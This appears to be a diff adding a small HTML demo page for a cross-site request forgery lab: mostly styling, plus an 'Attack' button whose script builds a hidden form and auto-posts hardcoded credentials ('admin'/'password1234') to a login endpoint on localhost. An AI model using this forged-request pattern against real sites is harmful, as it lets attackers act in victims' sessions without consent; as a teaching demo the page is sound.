@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Body styling */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #f0f2f5, #d4e4f7);
+            color: #333;
+        }
+
+        /* Container styling */
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        /* Heading styling */
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        /* Button styling */
+        button {
+            padding: 10px 20px;
+            color: #fff;
+            background-color: #e63946;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #b02a34;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>CSRF Attack Demo</h2>
+        <button onclick="attack()">Attack</button>
+    </div>
+
+    <script>
+        function attack() {
+            const username = 'admin';
+            const password = 'password1234';
+
+            // Send a POST request to the login endpoint (cross-site request)
+            const form = document.createElement('form');
+            form.action = 'http://localhost:8086/login';
+            form.method = 'POST';
+            form.innerHTML = `<input type="hidden" name="username" value="${username}">
+                             <input type="hidden" name="password" value="${password}">`;
+
+            document.body.appendChild(form);
+            form.submit();  // Submit the form (simulating a malicious request)
+        }
+    </script>
+</body>
+</html>
